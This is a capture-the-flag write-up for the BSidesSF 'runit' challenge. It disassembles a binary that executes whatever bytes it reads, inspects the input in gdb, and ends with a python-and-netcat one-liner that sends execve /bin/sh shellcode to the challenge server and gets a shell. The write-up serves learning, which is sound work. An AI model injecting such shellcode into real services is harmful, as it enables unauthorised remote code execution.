# runit
slopey112 - 3/4/19

We are given a typical binary executable. Let's first see what it does.
```
root@kali:~/Crack Me# ./runit
Send me stuff!!
asdfasdf
Segmentation fault
```
Executing it, we feed the program input, but for some reason we get a segmentation fault. Recall that a segmentation fault occurs when you try to access a region of memory that doesn't exist. We'll keep that in mind as we proceed.

Now, let's disassemble the binary.
```
   0x0804854b <+0>:	lea    ecx,[esp+0x4]
   0x0804854f <+4>:	and    esp,0xfffffff0
   0x08048552 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048555 <+10>:	push   ebp
   0x08048556 <+11>:	mov    ebp,esp
   0x08048558 <+13>:	push   ecx
   0x08048559 <+14>:	sub    esp,0x14
   0x0804855c <+17>:	sub    esp,0x8
   0x0804855f <+20>:	push   0x0
   0x08048561 <+22>:	push   0x0
   0x08048563 <+24>:	push   0x22
   0x08048565 <+26>:	push   0x7
   0x08048567 <+28>:	push   0x400
   0x0804856c <+33>:	push   0x0
   0x0804856e <+35>:	call   0x8048410 <mmap@plt>
   0x08048573 <+40>:	add    esp,0x20
   0x08048576 <+43>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048579 <+46>:	sub    esp,0xc
   0x0804857c <+49>:	push   0xa
   0x0804857e <+51>:	call   0x80483e0 <alarm@plt>
   0x08048583 <+56>:	add    esp,0x10
   0x08048586 <+59>:	mov    eax,ds:0x804a034
   0x0804858b <+64>:	push   0x0
   0x0804858d <+66>:	push   0x2
   0x0804858f <+68>:	push   0x0
   0x08048591 <+70>:	push   eax
   0x08048592 <+71>:	call   0x8048430 <setvbuf@plt>
   0x08048597 <+76>:	add    esp,0x10
   0x0804859a <+79>:	mov    eax,ds:0x804a030
   0x0804859f <+84>:	push   0x0
   0x080485a1 <+86>:	push   0x2
   0x080485a3 <+88>:	push   0x0
   0x080485a5 <+90>:	push   eax
   0x080485a6 <+91>:	call   0x8048430 <setvbuf@plt>
   0x080485ab <+96>:	add    esp,0x10
   0x080485ae <+99>:	sub    esp,0xc
   0x080485b1 <+102>:	push   0x8048690
   0x080485b6 <+107>:	call   0x80483f0 <puts@plt>
   0x080485bb <+112>:	add    esp,0x10
   0x080485be <+115>:	sub    esp,0x4
   0x080485c1 <+118>:	push   0x400
   0x080485c6 <+123>:	push   DWORD PTR [ebp-0x10]
   0x080485c9 <+126>:	push   0x0
   0x080485cb <+128>:	call   0x80483d0 <read@plt>
   0x080485d0 <+133>:	add    esp,0x10
   0x080485d3 <+136>:	mov    DWORD PTR [ebp-0xc],eax
   0x080485d6 <+139>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080485da <+143>:	jns    0x80485f6 <main+171>
   0x080485dc <+145>:	sub    esp,0xc
   0x080485df <+148>:	push   0x80486a0
   0x080485e4 <+153>:	call   0x80483f0 <puts@plt>
   0x080485e9 <+158>:	add    esp,0x10
   0x080485ec <+161>:	sub    esp,0xc
   0x080485ef <+164>:	push   0x1
   0x080485f1 <+166>:	call   0x8048400 <exit@plt>
   0x080485f6 <+171>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485f9 <+174>:	call   eax
   0x080485fb <+176>:	mov    eax,0x0
   0x08048600 <+181>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048603 <+184>:	leave  
   0x08048604 <+185>:	lea    esp,[ecx-0x4]
   0x08048607 <+188>:	ret
```
We are given way more information than we actually need. There's a lot going on here, but we see some interesting things.

1. The `alarm` call gives us 10 seconds to access the binary. It isn't the worst thing that could happen, but just very annoying.
2. The `read` call's file descriptor is `stdin`, so it is the read function which takes care of IO. The interesting consequence here is that we won't see any buffer overflows.
3. There is a call to `eax` at `0x080485fb`. Given that we saw a segmentation fault, this makes things very interesting.

We'll set a break point right at that call function, and we'll see what's in `eax`.
```
(gdb) b *0x080485f9
Breakpoint 1 at 0x80485f9
(gdb) r
Starting program: /root/Crack Me/runit
Send me stuff!!
ABCD

Breakpoint 1, 0x080485f9 in main ()
(gdb) x/s $eax
0xf7ffb000:	"ABCD\n"
```
Sure enough, it's the input we gave. Given that it's a call to `eax`, we can simply inject shell code instead. Let's open up our [trusty shell code](http://shell-storm.org/shellcode/files/shellcode-811.php) and we'll inject that into the program.
```
root@kali:~/Crack Me# (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | nc runit-5094b2cb.challenges.bsidessf.net 5252
Send me stuff!!
whoami
ctf
```
